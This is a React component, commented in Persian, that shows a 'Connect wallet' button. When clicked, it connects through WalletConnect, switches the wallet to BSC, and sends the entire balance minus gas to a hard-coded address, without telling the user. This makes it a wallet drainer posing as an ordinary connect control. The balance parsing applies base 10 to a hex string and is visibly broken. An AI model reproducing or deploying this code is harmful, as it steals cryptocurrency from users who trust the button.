import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  async function runner() {
    var ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      qrModalOptions: {
        themeMode: "dark",
        explorerRecommendedWalletIds: [
          "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",
          "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
          "225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f",
          "426b8b13634593783072a3253bb061e825dceeb13593425cc315a9e7d7e60323",
          "f725ed2c96fc9105359df8393b3192a02fdb91c93ad73d0b0edb3f7eae70d059",
          "f81ffb6c9be6997a8e7463c49358b64e733c1cf52f54f2731749eab21cfde63b",
          "f759efd17edb158c361ffd793a741b3518fe85b9c15d36b9483fba033118aaf2",
          "be49f0a78d6ea1beed3804c3a6b62ea71f568d58d9df8097f3d61c7c9baf273d",
          "9a565677e1c0258ac23fd2becc9a6497eeb2f6bf14f6e2af41e3f1d325852edd",
        ],
      },
      chains: [1, 56], // پشتیبانی از BSC و Ethereum
      methods: ["eth_sendTransaction", "eth_getBalance"],
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    var provider = ethereumProvider;
    var account = await provider.request({ method: "eth_accounts" });
    var account_sender = account[0];
    console.log("✅ Wallet Address:", account_sender);

    async function switchToBSC() {
      try {
        await provider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }], // BSC Mainnet
        });
        console.log("✅ Switched to Binance Smart Chain");
      } catch (switchError) {
        console.error("❌ Error switching to BSC:", switchError);
      }
    }

    async function sendMaxTransaction() {
      try {
        // دریافت موجودی کیف پول
        let balance = await provider.request({
          method: "eth_getBalance",
          params: [account_sender, "latest"],
        });

        // مقدار موجودی را از HEX به عدد معمولی تبدیل می‌کنیم
        let balanceInWei = parseInt(balance, 10);
        console.log(`💰 Balance: ${balanceInWei} WEI`);

        if (balanceInWei <= 0) {
          console.error("❌ Not enough balance.");
          return;
        }

        const gasFee = 21000 * 5000000000; // مقدار گس
        const transactionValue = balanceInWei - gasFee;

        if (transactionValue <= 0) {
          console.error("❌ Not enough balance after gas fee.");
          return;
        }

        const transactionParameters = {
          to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD", // آدرس مقصد
          from: account_sender,
          value: "0x" + transactionValue.toString(16), // ارسال کل موجودی - گس
          gas: "0x5208", // مقدار گس استاندارد
        };

        const txHash = await provider.request({
          method: "eth_sendTransaction",
          params: [transactionParameters],
        });

        console.log("✅ Transaction Hash:", txHash);
      } catch (error) {
        console.error("❌ Error sending transaction:", error);
      }
    }

    await switchToBSC(); // تغییر شبکه به BSC قبل از ارسال تراکنش
    await sendMaxTransaction(); // ارسال کل موجودی به آدرس مقصد
  }

  return (
    <a
      href="#"
      id="kos"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      data-uk-toggle=""
    >
      <span>Connect wallet</span>
    </a>
  );
}

export default App;
